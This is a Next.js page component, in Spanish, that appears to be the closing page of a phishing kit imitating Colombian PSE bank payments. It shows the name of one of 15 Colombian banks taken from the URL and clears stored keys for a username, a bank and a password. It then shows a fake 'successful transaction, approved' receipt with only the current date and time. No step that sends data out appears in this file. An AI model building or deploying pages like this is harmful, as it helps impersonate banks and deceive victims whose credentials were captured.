"use client";

import { useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';

export default function FinishPage() {
    const router = useRouter();
    const params = useParams();
    const bankId = params.bankId as string;

    useEffect(() => {
        // Clear localStorage
        localStorage.removeItem('pse_usuario');
        localStorage.removeItem('pse_banco');
        localStorage.removeItem('pse_password');
    }, []);

    const bankNames: Record<string, string> = {
        bancolombia: 'Bancolombia',
        davivienda: 'Davivienda',
        bogota: 'Banco de Bogotá',
        nequi: 'Nequi',
        avvillas: 'AV Villas',
        colpatria: 'Colpatria',
        popular: 'Popular',
        cajasocial: 'Caja Social',
        citibank: 'Citibank',
        falabella: 'Falabella',
        finandina: 'Finandina',
        itau: 'Itaú',
        occidente: 'Occidente',
        serfinanza: 'Serfinanza',
        tuya: 'Tuya'
    };

    return (
        <div className="min-h-screen bg-gradient-to-br from-green-50 to-green-100 flex flex-col">
            {/* Header */}
            <header className="bg-white border-b border-gray-200 p-4 flex justify-between items-center shadow-sm">
                <div className="text-xl font-bold text-gray-800">
                    {bankNames[bankId] || 'Banco'}
                </div>
                <button
                    onClick={() => router.push('/')}
                    className="text-blue-600 hover:text-blue-800 flex items-center gap-2"
                >
                    Salir
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
                    </svg>
                </button>
            </header>

            {/* Main Content */}
            <main className="flex-1 flex items-center justify-center px-4 py-12">
                <div className="bg-white rounded-lg shadow-xl p-8 w-full max-w-md text-center">
                    {/* Success Icon */}
                    <div className="mb-6 flex justify-center">
                        <div className="w-20 h-20 rounded-full bg-green-500 flex items-center justify-center">
                            <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                            </svg>
                        </div>
                    </div>

                    <h1 className="text-2xl font-bold text-gray-800 mb-4">
                        ¡Transacción exitosa!
                    </h1>

                    <p className="text-gray-600 mb-8">
                        Tu pago ha sido procesado correctamente. Recibirás una confirmación en tu correo electrónico.
                    </p>

                    <div className="bg-gray-50 rounded-lg p-6 mb-8 space-y-3 text-left">
                        <div className="flex justify-between text-sm">
                            <span className="text-gray-600">Estado:</span>
                            <span className="font-semibold text-green-600">Aprobado</span>
                        </div>
                        <div className="flex justify-between text-sm">
                            <span className="text-gray-600">Fecha:</span>
                            <span className="font-semibold text-gray-800">
                                {new Date().toLocaleDateString('es-ES')}
                            </span>
                        </div>
                        <div className="flex justify-between text-sm">
                            <span className="text-gray-600">Hora:</span>
                            <span className="font-semibold text-gray-800">
                                {new Date().toLocaleTimeString('es-ES')}
                            </span>
                        </div>
                    </div>

                    <div className="space-y-3">
                        <button
                            onClick={() => router.push('/')}
                            className="w-full py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors font-semibold shadow-md"
                        >
                            Volver al inicio
                        </button>
                        <button
                            onClick={() => window.print()}
                            className="w-full py-3 border-2 border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors font-semibold"
                        >
                            Imprimir comprobante
                        </button>
                    </div>

                    <p className="mt-6 text-xs text-gray-500">
                        Guarda este comprobante para futuras referencias
                    </p>
                </div>
            </main>

            {/* Footer */}
            <div className="h-2 bg-gradient-to-r from-yellow-400 via-red-500 to-blue-600"></div>
        </div>
    );
}
